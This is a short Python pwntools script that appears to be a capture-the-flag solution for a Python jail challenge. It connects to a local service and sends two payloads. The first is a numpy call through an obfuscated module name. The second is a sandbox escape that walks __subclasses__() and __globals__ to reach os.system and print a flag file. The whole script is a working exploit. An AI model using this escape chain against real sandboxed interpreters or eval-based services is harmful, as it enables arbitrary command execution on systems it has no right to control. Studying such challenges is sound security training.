#!/usr/bin/env python3
from pwn import *

def main():
    p = remote("localhost", "12380")
    numpy_escape = "RMbPOQHCzt.vdot(RMbPOQHCzt.intc(), RMbPOQHCzt.ndarray(1, {}))"
    py_escape = "[].__class__.__base__.__subclasses__()[134].__init__.__globals__['sys'].modules['os'].system('cat flag.txt')"

    p.sendlineafter(">>> ", numpy_escape)
    p.sendlineafter(">> ", py_escape)
    p.interactive()

if __name__ == "__main__":
    main()
